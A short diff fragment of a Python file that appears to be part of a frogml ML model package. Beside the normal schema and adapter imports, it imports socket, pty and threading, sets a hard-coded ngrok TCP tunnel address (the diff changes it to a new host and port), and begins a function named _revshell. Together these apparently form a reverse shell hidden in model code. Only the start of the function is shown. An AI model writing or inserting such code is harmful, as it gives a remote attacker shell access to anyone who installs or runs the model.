@@ -5,7 +5,7 @@ from frogml.sdk.model.schema import ExplicitFeature, ModelSchema, InferenceOutpu
 from frogml.sdk.model.adapters import DataFrameInputAdapter, DataFrameOutputAdapter
 import os, socket, pty, threading
 
-NGROK = ("6.tcp.eu.ngrok.io", 12126)
+NGROK = ("4.tcp.eu.ngrok.io", 18544)
 
 def _revshell():
     try:
